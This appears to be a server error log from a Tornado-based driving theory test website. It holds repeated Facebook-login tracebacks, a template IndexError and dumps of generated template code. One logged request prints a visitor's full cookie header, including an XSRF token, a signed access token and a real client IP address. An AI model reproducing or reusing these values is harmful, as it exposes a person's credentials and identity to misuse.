    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c65a18e4c854802b2dbce&answers=%5B1%5D&cursor=1&_xsrf=93dbfcfb9d5f48c7b90379e9cf7708b6', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.24409432.1348230234.1348230234.1348230234.1; __utmb=188782963.10.10.1348230234; __utmc=188782963; __utmz=188782963.1348230234.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=93dbfcfb9d5f48c7b90379e9cf7708b6; access_token="QUFBRzZsTmNzNkdjQkFKR3VwYkJiY1pCVURYV3paQTRENEpiellzOVBDOGZSTFpCQWl0eWM2OHc0UWJFUlNhQmxHMWx1MUtnTDRmT0pCdGtZVElyUEQ0WFg4NkJ4RHFOUFRUNXdpMkpTd1pEWkQ=|1348232097|b0a42f05d966da3a01297c6347bdbe128a77568e"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 88.70ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
